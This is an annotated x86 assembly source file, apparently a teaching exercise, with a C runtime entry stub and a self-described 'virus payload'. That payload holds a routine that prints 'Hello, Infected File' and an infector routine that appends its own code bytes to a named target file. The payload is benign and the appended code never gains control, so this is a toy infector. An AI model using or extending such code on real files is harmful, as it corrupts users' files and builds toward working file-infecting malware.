; ===== TEXT SECTION =========================================================
; This section contains executable code
section .text
    global  _start         ; Make _start symbol visible to linker
    extern  main           ; Declare main function (defined in main.c)


; ──────────────────────────────────────────────────────────────────
;  Custom runtime entry point: retrieve argc/argv from the stack,
;  call C main(argc, argv), then exit with its return value.
;  This replaces standard C library startup code, as we're using -nostdlib.
; ──────────────────────────────────────────────────────────────────
_start:
    ; When a program starts, the kernel places argc at top of stack,
    ; followed by pointers to each argument string (argv array)
    pop     eax            ; eax = argc (number of arguments)
    mov     ebx, eax       ; Save argc in ebx for passing to main
    mov     ecx, esp       ; ecx = argv (pointer to array of argument strings)
    push    ecx            ; Push argv as second parameter to main()
    push    ebx            ; Push argc as first parameter to main()
    call    main           ; Call C function: int main(int argc, char** argv)
    ; After main returns, eax contains the return value
    mov     ebx, eax       ; Move return value to ebx (exit code)
    mov     eax, 1         ; sys_exit system call number
    int     0x80           ; Invoke kernel to exit program

; ---------------------------------------------------------------------------
;  Virus payload – code to be appended to victim files
;  This entire block from code_start to code_end will be injected
;  into target files when the -a option is used.
; ---------------------------------------------------------------------------
global  code_start        ; Export symbols for C code to access
global  infection
global  infector
global  code_end

code_start:               ; Marks beginning of virus code to be injected

; ---------------------------------------------------------------------------
; void infection(void)
;   Prints "Hello, Infected File\n" to stdout using a single syscall.
;   This function demonstrates the virus payload's execution.
; ---------------------------------------------------------------------------
infection:
    push    ebx            ; Preserve callee-saved registers according to C calling convention
    push    esi            ; These registers must be restored before returning
    push    edi            ; to prevent corrupting the calling function's state

    mov     eax, 4         ; System call number for sys_write
    mov     ebx, 1         ; File descriptor 1 = stdout (standard output)
    mov     ecx, msg       ; Pointer to the message to display
    mov     edx, msg_len   ; Length of the message in bytes
    int     0x80           ; Invoke kernel to perform write operation

    pop     edi            ; Restore preserved registers in reverse order
    pop     esi            ; (LIFO - Last In, First Out)
    pop     ebx
    ret                    ; Return to caller

; ---------------------------------------------------------------------------
; void infector(char *filename)
;   Opens the specified file in append mode and injects the virus code.
;   This function performs the actual file infection.
; ---------------------------------------------------------------------------
infector:
    push    ebp            ; Set up stack frame - save old base pointer
    mov     ebp, esp       ; Set new base pointer to current stack pointer
    push    ebx            ; Preserve callee-saved registers
    push    esi
    push    edi

    mov     ebx, [ebp+8]   ; Load first parameter (filename pointer) from stack
                          ; +8 because: +4 for saved ebp, +4 for return address
    ; ---- open(filename, O_WRONLY|O_APPEND, 0777) ----
    mov     eax, 5         ; System call number for sys_open
    mov     ecx, 0x401     ; Flags: O_WRONLY (1) | O_APPEND (0x400)
                          ; Opens file for writing and positions at end
    mov     edx, 0777      ; File permissions (octal) - read/write/exec for all
    int     0x80           ; Invoke kernel to open the file
    cmp     eax, 0         ; Check if open succeeded (eax ≥ 0 means success)
    jl      .cleanup       ; If error (negative value), skip to cleanup
    mov     edi, eax       ; Save file descriptor for later use

    ; ---- write(fd, code_start, code_end - code_start) ----
    mov     eax, 4         ; System call number for sys_write
    mov     ebx, edi       ; File descriptor from previous open call
    mov     ecx, code_start; Pointer to start of virus code to append
    mov     edx, code_end - code_start  ; Calculate size of virus code in bytes
                          ; This automatically computes the exact size to inject
    int     0x80           ; Invoke kernel to write the data

    ; ---- close(fd) ----
    mov     eax, 6         ; System call number for sys_close
    mov     ebx, edi       ; File descriptor to close
    int     0x80           ; Invoke kernel to close the file

.cleanup:
    pop     edi            ; Restore preserved registers in reverse order
    pop     esi
    pop     ebx
    pop     ebp            ; Restore previous stack frame
    ret                    ; Return to caller

code_end:                 ; Marks end of virus code to be injected
                         ; The difference (code_end - code_start) gives the size

; ---------------------------------------------------------------------------
;                     Read-only data section
;                     Contains the virus message
; ---------------------------------------------------------------------------
section .data
msg     db  "Hello, Infected File", 10  ; Message to display (10 = newline)
msg_len equ $ - msg                     ; Calculate message length at assembly time
                                       ; $ represents current position, so $ - msg = length